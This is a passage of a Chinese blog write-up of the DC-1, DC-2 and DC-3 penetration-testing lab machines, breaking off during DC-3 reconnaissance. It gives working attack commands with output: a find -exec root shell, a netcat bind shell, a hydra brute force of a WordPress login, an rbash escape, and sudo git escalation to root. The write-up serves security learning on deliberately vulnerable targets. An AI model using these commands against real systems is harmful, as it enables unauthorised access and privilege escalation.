<p><strong>法一：【直接提权】</strong></p>
<p>提权：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">find -name flag4.txt -exec &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>即可打开finalflag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>





<p><strong>法二：【提升netcat权限】</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;home&#x2F;flag4$ find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;</span><br><span class="line">&lt;find flag4.txt -exec netcat -lvp 2233 -e &quot;&#x2F;bin&#x2F;sh&quot; \;                       </span><br><span class="line">listening on [any] 2233 ...</span><br><span class="line">192.168.33.128: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.33.136] from (UNKNOWN) [192.168.33.128] 49168</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">另外一个没有msfconsole的终端：</span><br><span class="line">netcat 192.168.33.136 2233</span><br><span class="line"></span><br><span class="line">之后正常执行就可以了</span><br></pre></td></tr></table></figure>











<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-1.png" alt="2-1"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -v 192.168.33.137 		&#x2F;&#x2F;-v是增强搜索效果，-vv更强</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">结果：</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">80&#x2F;tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.10 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http:&#x2F;&#x2F;dc-2&#x2F;</span><br><span class="line">7744&#x2F;tcp open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e&#x2F;C1hLs6R0CH1fSWfpJ0x45g77ZaEn&#x2F;nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB&#x2F;QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1&#x2F;xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN&#x2F;aBITwGOIBGrp06w&#x3D;&#x3D;</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH&#x2F;VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf&#x2F;QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud&#x2F;SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR&#x2F;PYR9</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE&#x3D;</span><br><span class="line">|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky&#x2F;2s+wXTH</span><br></pre></td></tr></table></figure>





<p>我们访问80端口：</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-2.png" alt="2-2"></p>
<p>我们发现被重定向到dc-2，于是我们可以配置静态路由，直接用<strong>域名访问</strong>。</p>
<blockquote>
<p>配置静态路由：</p>
<p>linux：/etc/hosts</p>
<p>windows:C:\Windows\System32\drivers\etc\hosts</p>
</blockquote>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-3.png" alt="2-3"></p>
<p>扫描一下目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[08:06:37] Starting: </span><br><span class="line">[08:06:46] 200 -   52KB - &#x2F;index.php                                                                                                    </span><br><span class="line">[08:06:47] 200 -   19KB - &#x2F;license.txt                                                                  </span><br><span class="line">[08:06:49] 200 -    7KB - &#x2F;readme.html                                                         </span><br><span class="line">[08:06:51] 301 -  319B  - &#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-admin&#x2F;                                          </span><br><span class="line">[08:06:52] 301 -  321B  - &#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-content&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-content&#x2F;                </span><br><span class="line">[08:06:52] 200 -   69B  - &#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php                               </span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;hello.php                       </span><br><span class="line">[08:06:52] 200 -    1B  - &#x2F;wp-admin&#x2F;admin-ajax.php           </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-admin&#x2F;  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?redirect_to&#x3D;http%3A%2F%2F192.168.33.137%2Fwp-admin%2F&amp;reauth&#x3D;1</span><br><span class="line">[08:06:52] 301 -  322B  - &#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;192.168.33.137&#x2F;wp-includes&#x2F;</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-config.php                         </span><br><span class="line">[08:06:52] 200 -    2KB - &#x2F;wp-login.php</span><br><span class="line">[08:06:52] 200 -   40KB - &#x2F;wp-includes&#x2F;   </span><br><span class="line">[08:06:52] 302 -    0B  - &#x2F;wp-signup.php  -&gt;  http:&#x2F;&#x2F;dc-2&#x2F;wp-login.php?action&#x3D;register</span><br><span class="line">[08:06:52] 500 -    0B  - &#x2F;wp-includes&#x2F;rss-functions.php</span><br><span class="line">[08:06:52] 200 -    0B  - &#x2F;wp-cron.php</span><br><span class="line">[08:06:53] 500 -    4KB - &#x2F;wp-admin&#x2F;setup-config.php</span><br><span class="line">[08:06:53] 405 -   42B  - &#x2F;xmlrpc.php</span><br><span class="line">[08:06:53] 200 -    1KB - &#x2F;wp-admin&#x2F;install.php</span><br></pre></td></tr></table></figure>





<h2 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h2><p>发现flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.	</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>



<h2 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h2><p>我们可以使用提示里的cewl来爬取有关密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;dc-2&#x2F; -w dc2.txt</span><br></pre></td></tr></table></figure>

<p>再用wpscan列出一些用户名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; --enumerate u</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jerry</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;dc-2&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>

<p>然后我们可以bp爆破，也可以hydra爆破：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt  -P passwd.txt dc-2 http-form-post &#39;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location&#39;</span><br></pre></td></tr></table></figure>

<p>也可以用wpscan直接爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;dc-2&#x2F; -e u -P  wordlist.txt</span><br></pre></td></tr></table></figure>







<h2 id="问题1【hydra】"><a href="#问题1【hydra】" class="headerlink" title="问题1【hydra】"></a>问题1【hydra】</h2><blockquote>
<p>抓包的POST数据是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log&#x3D;admin&amp;pwd&#x3D;sit&amp;wp-submit&#x3D;Log+In&amp;redirect_to&#x3D;http%3A%2F%2Fdc-2%2Fwp-admin%2F&amp;testcookie&#x3D;1</span><br></pre></td></tr></table></figure>

<p>为啥要改成上述样子？？？</p>
</blockquote>
<p>爆出两个密码，登录一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-04-13 08:39:16</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 714 login tries (l:3&#x2F;p:238), ~45 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;dc-2:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location</span><br><span class="line">[80][http-post-form] host: dc-2   login: tom   password: parturient</span><br><span class="line">[80][http-post-form] host: dc-2   login: jerry   password: adipiscing</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-04-13 08:40:02</span><br></pre></td></tr></table></figure>



<p>登录jerry，找到flag2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>





<h2 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h2><p>正常msfconsole受阻了，想起之前一个7744端口，尝试ssh登录，成功登录tom账号，发现flag3.txt，但是无法使用cat等命令<img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/2-4.png" alt="2-4"></p>
<p><strong>法一</strong>：vi可以使用【不过感觉有点小聪明】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>



<p><strong>法二</strong>：绕过rbash，切换/bin/bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;bin&#x2F;</span><br><span class="line">export PATH&#x3D;$PATH:&#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure>



<h2 id="flag4-1"><a href="#flag4-1" class="headerlink" title="flag4"></a>flag4</h2><p>看到flag3的内容想到是要给tom提权。</p>
<p>后来发现flag4只要切换jerry就可以了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>

<p>这个finalflag大概率是要在root目录下获取了。【可能还是和git有关】</p>
<h2 id="thefinalflag-1"><a href="#thefinalflag-1" class="headerlink" title="thefinalflag"></a>thefinalflag</h2><p>使用tom来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>发现不行，于是切换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br></pre></td></tr></table></figure>

<p>来执行，发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;git</span><br></pre></td></tr></table></figure>

<p>发现可以无密码执行root的git！</p>
<p>关于git提权可以看<a href="https://gtfobins.github.io/gtfobins/git/#limited-suid" target="_blank" rel="noopener">这个</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git -p help</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>提权完即可发现finalflag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># cat final-flag.txt</span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">&#x2F; &#x2F; &#x2F;\ \ \___| | |   __| | ___  _ __   ___  &#x2F; \</span><br><span class="line">\ \&#x2F;  \&#x2F; &#x2F; _ \ | |  &#x2F; _&#96; |&#x2F; _ \| &#39;_ \ &#x2F; _ \&#x2F;  &#x2F;</span><br><span class="line"> \  &#x2F;\  &#x2F;  __&#x2F; | | | (_| | (_) | | | |  __&#x2F;\_&#x2F; </span><br><span class="line">  \&#x2F;  \&#x2F; \___|_|_|  \__,_|\___&#x2F;|_| |_|\___\&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#39;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>





<p>SUID提权：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;procmail</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;exim4</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br></pre></td></tr></table></figure>

<p>发现不太行</p>
<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>先nmap发现IP：192.168.33.138</p>
<p>扫一下端口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-18 08:39 EDT</span><br><span class="line">Nmap scan report for 192.168.33.138</span><br><span class="line">Host is up (0.00100s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br></pre></td></tr></table></figure>

<p>加强扫一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:4E:BC:23 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.007 days (since Sun Apr 18 08:30:26 2021)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure>



<p>浏览器访问一下：</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-1.png" alt="3-1"></p>
<p>发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line"></span><br><span class="line">To get the flag, you&#39;ll obviously have to gain root privileges.</span><br><span class="line"></span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line"></span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure>

<p>只有一个flag</p>
<p>dirsearch扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 192.168.33.138 -x 301,403</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[08:45:29] Starting: </span><br><span class="line">[08:45:32] 200 -   18KB - &#x2F;LICENSE.txt                                                                                                  </span><br><span class="line">[08:45:32] 200 -    4KB - &#x2F;README.txt                                   </span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;cache&#x2F;                                                             </span><br><span class="line">[08:45:35] 200 -    2KB - &#x2F;administrator&#x2F;includes&#x2F; </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;          </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;index.php</span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;logs&#x2F;     </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;bin&#x2F;                                                                                   </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;cache&#x2F;                                                                   </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;cli&#x2F;                                                </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;components&#x2F;                                         </span><br><span class="line">[08:45:37] 200 -    0B  - &#x2F;configuration.php                  </span><br><span class="line">[08:45:39] 200 -    3KB - &#x2F;htaccess.txt                                                               </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;images&#x2F;                                 </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;includes&#x2F;              </span><br><span class="line">[08:45:39] 200 -    7KB - &#x2F;index.php                                                                           </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;layouts&#x2F;                                                                     </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;libraries&#x2F;                                                                 </span><br><span class="line">[08:45:40] 200 -   31B 